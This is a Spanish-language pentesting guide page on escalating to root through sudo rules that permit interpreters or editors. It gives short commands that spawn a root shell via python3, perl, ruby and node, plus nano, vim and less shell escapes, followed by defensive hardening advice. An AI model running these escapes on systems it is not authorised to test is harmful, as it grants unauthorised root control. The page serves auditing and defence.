# Abuso de comandos de Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpreters permitidos por Sudo

Si `sudo -l` permite a un usuario ejecutar un interpreter como root, trátalo como ejecución directa de código. Los interpreters están diseñados para ejecutar código arbitrario, por lo que una regla que permita `python3`, `perl`, `ruby`, `lua`, `node` o binarios similares suele equivaler a la ejecución de comandos como root, a menos que los argumentos estén estrictamente restringidos y validados.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Flujo de revisión habitual: primero lista los privilegios del usuario y, después, ejecuta una sentencia de Python con la opción `-c` del interpreter.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
A continuación se muestran otros ejemplos de intérpretes; los intérpretes enumerados documentan la ejecución de código inline o las API de procesos secundarios.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
La ruta exacta importa. Si la regla de sudo permite `/usr/bin/python3`, utiliza esa ruta exacta durante la validación.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editores permitidos por Sudo

Si `sudo -l` permite que un usuario ejecute un editor interactivo como root, trátalo como una superficie de ejecución de comandos, no como un permiso inofensivo para editar archivos. Los editores suelen poder ejecutar comandos de shell, leer archivos arbitrarios, escribir archivos arbitrarios o invocar helpers externos desde el propio editor.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Flujo de revisión habitual: enumera los privilegios del usuario y, a continuación, ejecuta cada editor o paginador permitido mediante sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Ejecución de comandos con Nano

Cuando `nano` está permitido mediante sudo, la ejecución de comandos puede estar disponible desde la interfaz del editor.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
A continuación, proporciona un comando como `id` o `/bin/sh` en el prompt de comandos de nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Si un shell interactivo no tiene flujos de terminal utilizables, esta forma de redirección asigna su salida estándar y sus errores al descriptor 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
La secuencia exacta de teclas puede variar según la versión de nano y las opciones de compilación, pero el problema de seguridad es el mismo: el editor se está ejecutando como root y puede invocar comandos externos.<sup>[[1]](#references)[[12]](#references)</sup>

### Otros escapes comunes de editores

Los editores de estilo Vim suelen permitir la ejecución de comandos mediante `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Los paginadores como `less` también pueden exponer la ejecución de shell.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Notas defensivas

- Evita conceder interpreters o editores interactivos mediante sudo.<sup>[[1]](#references)</sup>
- Prefiere wrappers fijos propiedad de root que realicen una única acción administrativa específica.<sup>[[1]](#references)[[2]](#references)</sup>
- Si no se puede evitar un interpreter, restringe la ruta exacta del script y evita los argumentos controlados por el usuario, los imports modificables, `PYTHONPATH` y la conservación insegura del entorno.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Si es necesario editar archivos, restringe la ruta exacta del archivo y considera usar `sudoedit` con versiones parcheadas de sudo y una gestión estricta del entorno.<sup>[[1]](#references)[[2]](#references)</sup>
- Revisa `SETENV`, `env_keep`, los directorios de trabajo modificables, las rutas de módulos/imports modificables, `NOEXEC`, `use_pty` y el logging, pero no los consideres un sandbox completo.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — página del manual de Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Línea de comandos y entorno — documentación de Python](https://docs.python.org/3/using/cmdline.html)
- [4] [os — interfaces misceláneas del sistema operativo — documentación de Python](https://docs.python.org/3/library/os.html)
- [5] [perlrun — cómo ejecutar el interpreter de Perl](https://perldoc.perl.org/perlrun)
- [6] [exec — documentación de Perl](https://perldoc.perl.org/functions/exec)
- [7] [Opciones de línea de comandos de Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — documentación de Ruby](https://ruby-doc.org/3.4/Kernel.html)
- [9] [API de línea de comandos — documentación de Node.js](https://nodejs.org/api/cli.html)
- [10] [Proceso hijo — documentación de Node.js](https://nodejs.org/api/child_process.html)
- [11] [Página del manual de lua de Lua 5.4](https://www.lua.org/manual/5.4/lua.html)
- [12] [El editor de texto GNU nano](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — página del manual de Linux](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirecciones — manual de referencia de Bash](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
